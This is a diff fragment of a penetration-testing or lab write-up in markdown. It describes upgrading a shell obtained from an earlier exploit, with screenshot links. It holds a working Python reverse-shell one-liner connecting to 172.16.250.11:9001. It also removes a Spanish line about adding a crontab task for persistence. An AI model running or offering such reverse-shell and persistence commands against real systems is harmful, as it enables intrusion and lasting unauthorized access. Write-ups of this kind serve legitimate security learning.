@@ -235,16 +235,14 @@ We can see that the root user has ALL-ALL permits
 
 After receiving a shell from the previously executed exploit, we upgraded to a bash shell
 
+![[Pasted image 20250512163457.png]]
+
 ```python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.250.11",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
 ```
 
 
 ![[Pasted image 20250512162449.png]]
-
-
-creamos una terea crontab para tener persistencia
-
 
 credenciales
 ![[Pasted image 20250512164302.png]]
